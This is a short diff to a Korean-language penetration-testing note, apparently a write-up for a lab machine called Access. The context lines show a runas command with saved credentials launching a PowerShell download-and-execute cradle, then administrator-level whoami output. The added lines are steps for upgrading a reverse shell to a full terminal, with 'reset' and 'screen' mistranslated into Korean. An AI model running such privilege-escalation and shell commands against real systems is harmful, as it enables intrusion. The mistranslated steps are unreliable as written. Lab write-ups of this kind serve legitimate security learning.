@@ -41,3 +41,14 @@ runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webcli
 PS C:\Windows\system32>whoami
 access\administrator
 ```
+
+
+
+## 쉘 업그레이드
+
+1. `python -c 'import pty;pty.spawn("bash")'`
+2. \[ctrl-Z]를 눌러 백그라운드 셸로 이동합니다.
+3. `stty raw -echo`
+4. `fg`
+5. `재설정`
+6. 단말기 유형을 묻는 메시지가 표시되면 `화면을` 입력합니다.
